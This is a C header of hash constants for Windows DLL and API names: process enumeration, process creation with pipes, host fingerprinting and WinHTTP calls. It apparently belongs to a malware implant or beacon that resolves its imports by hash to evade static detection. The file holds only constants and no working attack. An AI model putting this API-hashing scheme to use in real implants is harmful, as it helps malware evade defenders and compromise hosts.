#ifndef HASHES_H
#define HASHES_H

#define H_KERNEL32		0x367DC15A
#define H_NTDLL			0x4898F593
#define H_WINHTTP		0x4338CE14
#define H_IPHLPAPI		0xF34C9A44
#define H_ADVAPI32		0x00367FD5

#define H_CreateToolhelp32Snapshot	0x9333B63F
#define H_Process32First		0x2ED7346E
#define H_Process32Next			0xDFC29499
#define H_CreateProcessA		0x4D5F406E
#define H_CreatePipe			0xD9EA4301
#define H_ReadFile			0x6D0D0E8F
#define H_WriteFile			0xA2DB925B
#define H_CloseHandle			0xE288B704
#define H_CreateFileA			0x941AAD00
#define H_GetFileSize			0xE4EDD918
#define H_LocalAlloc			0x299C89B8
#define H_LocalReAlloc			0xD60BE199
#define H_LocalFree			0x500DAC68
#define H_WaitForSingleObject		0xFC32385F
#define H_GetComputerNameExA		0x91F73EEC
#define H_GetUserNameA			0xB8C4233B
#define H_GetModuleFileNameA		0x1476BEF2
#define H_GetCurrentProcessId		0x74DE260F
#define H_GetTickCount			0xA5C1F9B7
#define H_Sleep				0xC57A081D
#define H_ExitProcess			0xCB11CBC6
#define H_GetNativeSystemInfo		0x90A26E0F
#define H_GetModuleHandleA		0x54C332DA
#define H_GetProcAddress		0x84C96E3E
#define H_LoadLibraryA			0x19F0EEAF

#define H_RtlGetVersion			0xFFB66EDE
#define H_RtlRandomEx			0x4FCDAC4F

#define H_GetAdaptersInfo		0xD73288B5

#define H_WinHttpOpen			0x9A511652
#define H_WinHttpConnect		0x21C6719D
#define H_WinHttpOpenRequest		0x2A0511D0
#define H_WinHttpSetOption		0x0BE7EDB2
#define H_WinHttpSendRequest		0x61948B40
#define H_WinHttpReceiveResponse	0x0E98CC51
#define H_WinHttpReadData		0x9F98E89C
#define H_WinHttpCloseHandle		0x3F4B1074

#endif
